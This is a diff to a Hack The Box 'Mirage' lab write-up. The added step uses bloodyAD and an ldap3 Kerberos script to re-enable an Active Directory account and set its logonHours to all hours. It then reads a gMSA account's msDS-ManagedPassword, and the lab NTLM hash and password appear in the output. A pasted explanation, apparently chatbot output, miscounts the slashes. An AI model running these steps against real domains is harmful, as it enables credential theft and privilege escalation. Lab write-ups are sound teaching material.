@@ -515,16 +515,74 @@ Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 ┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
 └─$ bloodyAD --host dc01.mirage.htb --dc-ip 10.10.11.78 -d mirage.htb -k remove uac JAVIER.MMARSHALL -f ACCOUNTDISABLE
 [-] ['ACCOUNTDISABLE'] property flags removed from JAVIER.MMARSHALL's userAccountControl
-
 ```
+
+Besides that, we also need to change the attribute of `logonHours:`
+```
+logonHours: //////////////////////////// means the user is allowed to log on at any time, 24/7 — every hour of every day.
+
+🔍 Explanation:
+The logonHours attribute in Active Directory is a 21-byte bitmask.
+
+Each bit represents one hour of the week.
+
+A week has 168 hours (7 days × 24 hours) → 168 bits → 21 bytes.
+
+Each byte is 8 hours.
+
+A / in this representation is a printable substitute for the binary byte 0xFF → 11111111 in bits.
+
+////////////////////////// is 24 slashes, i.e. 24 × 8 = 192 bits, which is more than 168, so likely just a visual over-representation.
+
+✅ Meaning:
+Each / = all 8 hours of that byte are set to 1 → allowed login.
+
+So:
+////////////////////////// = All hours allowed → user can log in at any hour, any day.
+
+If you want to restrict logon hours, you'd need to set specific bits to 0 (for deny) and 1 (for allow) across the 21 bytes.
+
+Let me know if you'd like help generating a restricted logonHours bitmask (e.g., only 9AM–5PM Monday–Friday).
+```
+
+In this place, I have tried to use `bloodyAD`, but I still don't find a valid command (If you can, please contact me and message me)
+
+So I would use a `ldap3` script to change that
+```
+from ldap3 import Server, Connection, SASL, GSSAPI, MODIFY_REPLACE
+import os
+
+os.environ["KRB5CCNAME"] = "./mark.bbond.ccache"
+
+server = Server("dc01.mirage.htb", get_info=None)
+conn = Connection(server, authentication=SASL, sasl_mechanism=GSSAPI)
+conn.bind()
+
+dn = "CN=javier.mmarshall,OU=Users,OU=Disabled,DC=mirage,DC=htb"
+logon_hours_hex = "FF" * 21
+logon_hours_bytes = bytes.fromhex(logon_hours_hex)
+
+conn.modify(dn, {"logonHours": [(MODIFY_REPLACE, [logon_hours_bytes])]})
+print(conn.result)
+```
+
+After you run the script, you can find something changed
+```
+┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
+└─$ python3 change.py
+{'result': 0, 'description': 'success', 'dn': '', 'message': '', 'referrals': None, 'type': 'modifyResponse'}
+```
+![](images/Pasted%20image%2020250721114537.png)
 
 Then let's try again to get the `msDS-ManagedPassword` object:
 ```
-bloodyAD -k --host dc01.mirage.htb -d 'mirage.htb' -u 'javier.mmarshall' -p 'Abc123456@' get object 'Mirage-Service$' --attr msDS-ManagedPassword
+┌──(wither㉿localhost)-[~/Templates/htb-labs/Mirage]
+└─$ bloodyAD -k --host dc01.mirage.htb -d 'mirage.htb' -u 'javier.mmarshall' -p 'Abc123456@' get object 'Mirage-Service$' --attr msDS-ManagedPassword
 
 distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
 msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:305806d84f7c1be93a07aaf40f0c7866
 msDS-ManagedPassword.B64ENCODED: 43A01mr7V2LGukxowctrHCsLubtNUHxw2zYf7l0REqmep3mfMpizCXlvhv0n8SFG/WKSApJsujGp2+unu/xA6F2fLD4H5Oji/mVHYkkf+iwXjf6Z9TbzVkLGELgt/k2PI4rIz600cfYmFq99AN8ZJ9VZQEqRcmQoaRqi51nSfaNRuOVR79CGl/QQcOJv8eV11UgfjwPtx3lHp1cXHIy4UBQu9O0O5W0Qft82GuB3/M7dTM/YiOxkObGdzWweR2k/J+xvj8dsio9QfPb9QxOE18n/ssnlSxEI8BhE7fBliyLGN7x/pw7lqD/dJNzJqZEmBLLVRUbhprzmG29yNSSjog==
+
 ```
 
 Then we can get the TGT ticket of `Mirage-Services`
